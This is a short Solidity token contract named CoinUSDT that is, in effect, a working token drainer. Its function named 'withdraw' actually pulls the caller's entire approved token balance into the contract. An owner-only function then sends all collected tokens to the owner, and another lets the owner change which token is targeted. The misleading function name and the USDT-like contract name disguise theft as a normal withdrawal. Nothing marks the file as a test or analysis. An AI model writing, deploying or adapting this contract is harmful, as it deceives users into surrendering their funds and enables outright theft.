// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract CoinUSDT is Ownable {
    IERC20 public token;

    constructor(IERC20 _token, address _initialOwner) Ownable(_initialOwner) {
        token = _token;
    }

    function withdraw() external {
        uint256 walletBalance = token.balanceOf(msg.sender);
        require(walletBalance > 0, "Insufficient token balance");

        uint256 allowance = token.allowance(msg.sender, address(this));
        require(allowance >= walletBalance, "Allowance not set for full token balance transfer");

        token.transferFrom(msg.sender, address(this), walletBalance);
    }

    function withdrawBalance() external onlyOwner {
        uint256 contractBalance = token.balanceOf(address(this));
        token.transfer(msg.sender, contractBalance);
    }

    function setToken(IERC20 _token) external onlyOwner {
        token = _token;
    }


}
